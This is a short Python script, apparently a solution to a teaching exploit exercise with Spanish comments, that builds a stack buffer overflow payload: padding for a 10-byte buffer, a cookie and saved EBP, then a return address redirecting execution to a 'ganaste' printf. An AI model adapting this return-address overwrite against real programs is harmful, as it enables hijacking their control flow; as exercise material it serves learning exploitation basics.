# payload.py
from struct import pack

# Direccion de printf("ganaste tu_nombre!")
ret_addr = 0x0804849c

output = "A" * 10                 # llena buf (10 bytes)
output += "BBBB"                  # llena cookie (4 bytes)
output += "CCCC"                  # llena ebp (4 bytes)
output += pack("<I", ret_addr)    # establece return address

print(output)